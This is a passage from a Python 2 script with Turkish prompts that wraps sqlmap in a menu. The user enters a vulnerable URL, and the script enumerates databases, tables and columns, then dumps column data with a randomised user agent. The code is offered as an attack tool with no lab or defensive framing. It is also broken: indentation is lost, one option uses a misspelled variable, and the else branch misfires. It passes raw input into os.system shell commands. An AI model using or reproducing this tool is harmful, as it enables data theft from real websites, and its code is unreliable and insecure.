""")
islemno = raw_input("islem> ")
if(islemno=="1"):
aciklilink = raw_input("Acikli link girin> ")
os.system("sqlmap -u " + aciklliink + " --dbs --random-agent ")
if(islemno=="2"):
aciklilink = raw_input("Acikli link girin> ")
veritabani = raw_input("veritabani adini girin> ")
os.system("sqlmap -u " + aciklilink + " -D" + veritabani + " --tables --random-agent")
if(islemno=="3"):
aciklilink = raw_input("Acikli link girin> ")
veritabani = raw_input("veritabani adini girin> ")
tablo = raw_input("tablo adini girin> ")
os.system("sqlmap -u " + aciklilink + " -D" + veritabani + " -T " + tablo + " --columns --random-agent")
if(islemno=="4"):
aciklilink = raw_input("Acikli link girin> ")
veritabani = raw_input("veritabani adini girin> ")
tablo = raw_input("tablo adini girin> ")
colon = raw_input("colon adi girin> ")
os.system("sqlmap -u " + aciklilink + " -D" + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
else:
print("hatali secim yaptiniz")
